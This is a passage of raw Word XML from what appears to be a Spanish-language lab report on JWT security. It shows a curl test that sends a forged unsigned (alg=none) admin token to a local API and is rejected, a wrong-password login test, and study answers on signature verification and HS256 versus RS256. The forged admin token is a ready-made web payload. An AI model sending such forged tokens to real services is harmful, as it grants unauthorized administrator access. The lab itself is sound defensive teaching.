          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Prueba 4 – El token forjado (alg=none) es rechazado</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC3A01B" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&gt; Prueba 4 – Rechazo del token forjado</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="3318FD9F" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9360" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0C0C0C"/>
          </w:tcPr>
          <w:p w14:paraId="37E1F803" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="72F45A83" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlckBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiJ9." </w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>\</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2341421C" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">     http://127.0.0.1:8001/admin</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19920304" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="118A77F0" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>HTTP 401 Unauthorized</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0827F09B" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>{"detail": "Token inválido"}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F46298B" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41B4C563" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>✓</w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve"> CORRECTO – la API segura rechaza tokens sin firma RSA válida</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F054599" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">  El mismo token que daba HTTP 200 en la API vulnerable</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="184BE83C" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>ahora es rechazado inmediatamente.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="60C67C99" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39A6F07E" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Prueba 5 – Credenciales incorrectas</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5464F5BA" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  &gt; Prueba 5 – Login con contraseña incorrecta</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="6DE198DE" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9360" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0C0C0C"/>
          </w:tcPr>
          <w:p w14:paraId="4033C640" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="1D494B63" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>curl -X POST "http://127.0.0.1:8001/login" \</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FDDC90B" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     -H "Content-Type: application/json" \</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A7667B1" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     -d '{"email":"admin@example.com","password":"CLAVE_INCORRECTA"}'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B74A9B9" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="559FEF6E" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>HTTP 401 Unauthorized</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73B124E7" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>{"detail": "Credenciales inválidas"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="02B26CAC" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11FFA4E1" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3813E539" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>1. ¿Por qué verify_signature=False es una vulnerabilidad crítica?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E4D9CE3" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3288A0DC" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Porque desactiva la validación de la firma del JWT. En otras palabras, el servidor acepta cualquier token aunque haya sido modificado o creado por un atacante.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E8FDD15" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="eastAsia"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="eastAsia"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">Eso permite cambiar datos como el rol de usuario (user </w:t>
      </w:r>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="eastAsia"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>→</w:t>
      </w:r>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="eastAsia"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> admin) o incluso crear tokens falsos desde cero. Es como tener una cerradura que no revisa si la llave es auténtica.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30213B35" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05E92C29" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>2. ¿Qué diferencia existe entre HS256 y RS256?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D4FD472" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A95F20E" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>La principal diferencia es cómo manejan las claves.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4573D85B" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="083FE9A9" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>HS256 usa una sola clave secreta para firmar y verificar el token. Si alguien descubre esa clave, puede crear tokens válidos fácilmente.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16F3C0A1" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="203197DD" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>RS256 usa dos claves: una privada para firmar y una pública para verificar. La pública puede compartirse sin riesgo, porque no sirve para generar tokens nuevos.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="299BB5AE" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Por eso RS256 es más seguro y muy usado en sistemas grandes y microservicios.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5595971F" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66D361F7" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>3. ¿Qué es un JWT y qué contiene?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56623B89" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1192EBD0" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Un JWT (JSON Web Token) es un formato usado para autenticar usuarios y compartir información de forma segura.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C6D3366" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1459A9AC" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Está dividido en tres partes:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ECEE840" w14:textId="77777777" w:rsidR="00AB6745" w:rsidRPr="00AB6745" w:rsidRDefault="00AB6745" w:rsidP="00AB6745">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
